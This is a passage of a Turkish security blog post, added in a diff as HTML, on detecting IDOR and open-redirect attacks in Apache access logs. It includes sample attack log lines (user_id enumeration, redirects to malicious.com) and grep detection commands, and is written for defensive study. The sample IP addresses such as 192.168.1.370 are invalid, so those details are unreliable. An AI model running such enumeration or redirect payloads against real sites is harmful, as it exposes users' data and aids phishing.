+</blockquote>
+<hr>
+<h3 id="idor-insecure-direct-object-reference">
+  IDOR (Insecure Direct Object Reference)
+  <a class="heading-link" href="#idor-insecure-direct-object-reference">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>IDOR, bir kullanıcının yetkisi olmadan doğrudan başka bir kullanıcının verilerine veya nesnelerine erişim sağlayabildiği bir güvenlik açığıdır. Web uygulamaları, kaynaklara (dosyalar, kullanıcı verileri, kayıtlar vb.) erişirken, nesne referanslarını (örneğin dosya isimleri, kullanıcı ID’leri, sipariş numaraları) doğrudan ve doğrulanmadan URL parametrelerinde kullanırsa, saldırgan bu referansları değiştirerek başkalarının verilerine erişebilir.</p>
+<h4 id="idor-göstergeleri-indikatörleri">
+  IDOR Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#idor-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL parametrelerinde değiştirilebilir ve doğrudan nesne referansı içeren ID veya dosya isimleri (<code>user_id=123</code>, <code>file=report45.pdf</code>)</li>
+<li>Aynı IP’den veya kullanıcı ajanından farklı kullanıcıya ait ID’lere erişim denemeleri</li>
+<li>Anormal sıra dışı veya beklenmeyen nesne numaralarının URL parametrelerinde kullanılması</li>
+<li>Kısa süre içinde farklı nesnelere ardışık erişim denemeleri</li>
+<li>Oturum veya kimlik doğrulama kontrollerinin zayıf olduğu durumlarda, yetkisiz erişim istekleri</li>
+</ul>
+<h4 id="apache-erişim-loglarında-idortespiti">
+  Apache Erişim Loglarında IDOR Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-idortespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>IDOR saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.370 - - [02/Jun/2025:00:10:05 +0300] &#34;GET /profile?user_id=100 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.370 - - [02/Jun/2025:00:10:20 +0300] &#34;GET /profile?user_id=101 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.370 - - [02/Jun/2025:00:10:35 +0300] &#34;GET /profile?user_id=102 HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep “GET /profile?user_id=” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="open-redirect-açık-yönlendirme">
+  Open Redirect (Açık Yönlendirme)
+  <a class="heading-link" href="#open-redirect-a%c3%a7%c4%b1k-y%c3%b6nlendirme">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Open Redirect, bir web uygulamasının kullanıcıları başka bir URL’ye yönlendirmek için kullandığı parametrelerin kötüye kullanılması sonucu ortaya çıkan güvenlik açığıdır. Saldırgan, kullanıcıları zararlı veya sahte sitelere yönlendirmek için bu açıkları kullanır.</p>
+<p>Bu saldırı türü, phishing (oltalama) saldırılarının yaygın bir aracıdır; kullanıcılar güvenilir bir siteye tıkladıklarını düşünürken, aslında zararlı bir siteye yönlendirilirler.</p>
+<h4 id="open-redirect-göstergeleri-indikatörleri">
+  Open Redirect Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#open-redirect-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL parametrelerinde <code>redirect=</code>, <code>url=</code>, <code>next=</code>, <code>return=</code>, <code>dest=</code>, <code>continue=</code> gibi yönlendirme amaçlı parametreler</li>
+<li>Bu parametrelerde tam veya kısmi başka domain adreslerinin (ör. <code>http://malicious.com</code>) yer alması</li>
+<li>Aynı IP’den farklı zararlı URL’lere yönlendirme denemeleri</li>
+<li>Kısa süre içinde aynı parametreye farklı dış URL’lerin girilmesi</li>
+<li>HTTP durum kodu 3xx (301, 302, 307) olan isteklerde şüpheli yönlendirmeler</li>
+</ul>
+<h4 id="apache-erişim-loglarında-open-redirecttespiti">
+  Apache Erişim Loglarında Open Redirect Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-open-redirecttespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Open Redirect saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.380 - - [02/Jun/2025:00:45:10 +0300] &#34;GET /login?redirect=http://malicious.com HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.381 - - [02/Jun/2025:00:46:05 +0300] &#34;GET /index?url=https://phishing-site.com HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -E “redirect=|url=|next=|return=|dest=|continue=” /var/log/apache2/access.log | grep -E “<a href="http://%7chttps://"  class="external-link" target="_blank" rel="noopener">http://|https://</a>&quot;</p>
+</blockquote>
+<hr>
+<p>Apache web sunucuları, dünya genelinde en çok kullanılan ve güvenilir sunucu yazılımlarından biri olmasına rağmen, çeşitli web saldırılarına karşı her zaman savunmasız kalabilir. Bu nedenle, olası saldırıların tespiti ve önlenmesi için erişim loglarının düzenli olarak analiz edilmesi kritik öneme sahiptir.</p>
+<p>Erişim loglarında görülebilecek anormal istekler, şüpheli parametreler ve beklenmedik dosya erişimleri, web sunucusunun hedef alındığını gösteren önemli ipuçlarıdır. Bu nedenle, logların etkin şekilde izlenmesi, otomatik analiz araçları ve güvenlik duvarları ile desteklenmeli; kullanıcı girdileri mutlaka filtrelenmeli ve güvenlik güncellemeleri düzenli olarak uygulanmalıdır.</p>
+<p>Sonuç olarak, Apache web sunucusunda saldırı tespiti, güçlü bir güvenlik duruşu oluşturmanın temel taşlarından biridir. Proaktif yaklaşımlar, hem veri kaybını önler hem de sistemin sürekliliğini sağlar. Güvenlik, sadece bir teknoloji değil, sürekli takip ve iyileştirme gerektiren bir süreçtir.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2026
+     Yusuf Talha ARABACI 
+    ·
+    
+    Site program altyapısı <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
